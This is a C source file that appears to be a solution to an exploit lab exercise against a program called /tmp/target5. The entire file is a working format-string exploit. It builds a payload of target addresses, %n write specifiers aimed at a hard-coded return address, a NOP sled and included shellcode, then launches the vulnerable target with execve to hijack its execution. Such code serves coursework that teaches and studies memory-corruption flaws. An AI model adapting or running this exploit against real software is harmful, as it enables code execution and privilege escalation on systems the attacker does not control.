#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define PAYLOAD_SIZE (400)
#define NOP (0x90)
#define RET_ADDR (0xbffffc28)

int main(void)
{
    char *args[3];
    char *env[1];
    char payload[PAYLOAD_SIZE];
    char *fmt;
    char *fmtest;
    /* Build payload */
    memset(payload, NOP, PAYLOAD_SIZE);
    payload[PAYLOAD_SIZE-1] = '\0';
    fmt = "\xff\xff\xff\xff\xac\xfc\xff\xbf"
          "\xff\xff\xff\xff\xad\xfc\xff\xbf"
          "\xff\xff\xff\xff\xae\xfc\xff\xbf"
          "\xff\xff\xff\xff\xaf\xfc\xff\xbf"
          "%08X%08X%08X"
          "%215u%n%240u%n%256u%n%192u%n";

    memcpy(payload, fmt, strlen(fmt));
    memcpy(payload + PAYLOAD_SIZE - strlen(shellcode) - 4, shellcode, strlen(shellcode));

    args[0] = TARGET;
    args[1] = payload;
    args[2] = NULL;
    env[0] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
